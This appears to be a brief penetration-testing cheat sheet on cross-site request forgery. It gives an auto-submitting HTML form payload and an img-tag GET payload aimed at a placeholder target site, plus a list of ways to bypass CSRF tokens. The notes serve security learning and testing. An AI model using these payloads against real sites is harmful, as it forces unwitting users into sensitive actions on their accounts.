# CSRF


## Enumeration

Look for sensitive client requests/actions to server that do not appear to involve any CSRF preventative measures.


## Payloads

Need to craft a HTTP redirect to the action on the target server. E.g.:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html>
    <body>
        <form action="https://www.target-site.com/sensitive-action" method="POST">
            <input name=param1 value=paramValue1 />
            <input name=param2 value=paramValue2 />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Alternatively for GET methods, try including an image or iframe:
```
<img src="https://www.target-website.com/sensitive-action?param1=value1&param2=value2" />
```
But this wouldn't need an external server to relay the requests, the URL can be fed directly to the victim in this case.

## Bypassing Tokens

Try:
- Switching from POST method to GET or another method.
- Omitting the entire CSRF token parameter to see if server ignores validation.
- Using a valid CSRF token that is generated from another account (in case server doesn't verify the token-session relationship accurateltely).
- 
